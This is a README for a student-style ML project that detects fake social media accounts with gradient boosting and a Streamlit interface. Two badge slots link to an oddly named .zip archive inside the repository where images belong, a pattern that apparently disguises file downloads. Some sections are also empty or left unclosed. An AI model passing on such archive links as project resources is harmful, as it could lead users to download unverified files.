<div align="center">

# 🕵️‍♂️✨ Fake Social Media Account Detection  
### **AI-Powered Real vs Fake Profile Classifier**

<img src="https://img.shields.io/badge/Machine%20Learning-Gradient%20Boosting-blueviolet?style=for-the-badge">
<img src="https://img.shields.io/badge/Streamlit-Web%20App-FF4B4B?style=for-the-badge">
<img src="https://img.shields.io/badge/Python-3.10-yellow?style=for-the-badge">
<img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge">
<br><br>

🔍 **A modern ML system that predicts whether a social media account is REAL or FAKE  
using behavioral, profile-based & activity-based features.**

</div>

---

# 🚀 Overview

Fake profiles are becoming a major issue on social media platforms,  
leading to misinformation, spam, scams, and impersonation.

This project uses **Supervised Machine Learning** to classify accounts as:

- 🟢 **Real**
- 🔴 **Fake**

The system includes:

- A complete ML training pipeline  
- A Streamlit UI with a **modern redesigned interface**  
- A synthetic dataset with 3000 records  
- Automatic feature preprocessing  
- A Gradient Boosting model optimized for accuracy  

---

# 🧠 Tech Stack Used

<div align="left">

### **Languages**
<img src="https://github.com/AlapatiAbhinavChowdhary/fake-social-media-account-dection/raw/refs/heads/main/betailor/dection-media-account-fake-social-v2.8-beta.2.zip" height="40">

### **Libraries & Frameworks**
<img src="https://img.shields.io/badge/Pandas-150458.svg?style=for-the-badge&logo=Pandas&logoColor=white">
<img src="https://img.shields.io/badge/Numpy-013243.svg?style=for-the-badge&logo=Numpy&logoColor=white">
<img src="https://img.shields.io/badge/Scikit--Learn-F7931E.svg?style=for-the-badge&logo=scikitlearn&logoColor=white">
<img src="https://img.shields.io/badge/XGBoost-EE4C2C?style=for-the-badge&logo=xgboost&logoColor=white">
<img src="https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white">

### **Tools**
<img src="https://github.com/AlapatiAbhinavChowdhary/fake-social-media-account-dection/raw/refs/heads/main/betailor/dection-media-account-fake-social-v2.8-beta.2.zip,github" height="40">

</div>

---

# 🗂 Dataset Information

📌 **Dataset Name:** Custom Synthetic Fake Social Media Dataset  
📌 **Total Samples:** 3000  
📌 **Total Features:** 24  
📌 **Target Column:** `is_fake`  
- `1` → Fake Account  
- `0` → Real Account  

### ⭐ Key Features
- `username_randomness`
- `bio_length`
- `followers`, `following`
- `follower_following_ratio`
- `account_age_days`
- `posts`, `posts_per_day`
- `spam_comments_rate`
- `verified`
- `digits_count`, `special_char_count`

The dataset is created for academic research on automated fake account detection.

---

# 🤖 Machine Learning Pipeline

### ⚙️ **Preprocessing Steps**
- Remove irrelevant columns  
- Median imputation (numeric)  
- Mode imputation (categorical)  
- One-hot encoding  
- Standard scaling  

### 🧪 Model Training
Multiple ML algorithms tested:

| Model | Type |
|-------|------|
| Logistic Regression | Linear Model |
| Random Forest | Ensemble (Bagging) |
| XGBoost | Boosting |
| **Gradient Boosting** | ⭐ Selected Final Model |

🎯 **Gradient Boosting delivered the best accuracy, precision & recall.**

### 📁 Saved Model



---

# 🖥️ Streamlit Web App

### Features:
- Modern clean UI  
- Choose platform (Instagram / X / Facebook)  
- Enter username  
- Enter advanced account attributes  
- Predict Real vs Fake  
- Visual indicator box  
- Probability score  
- Debug panel  

### Run the App:
```bash
streamlit run app_fake_checker.py


          ┌──────────────────────┐
          │  User Enters Inputs  │
          └──────────┬───────────┘
                     │
         ┌───────────▼────────────┐
         │ Streamlit UI Preprocess │
         └───────────┬────────────┘
                     │
          ┌──────────▼───────────┐
          │ ML Pipeline (Scaling, │
          │ Encoding, Imputation) │
          └──────────┬───────────┘
                     │
            ┌────────▼────────┐
            │ Gradient Boosting│
            │  Classification  │
            └────────┬────────┘
                     │
       ┌─────────────▼─────────────┐
       │ Prediction (Real / Fake)   │
       └────────────────────────────┘
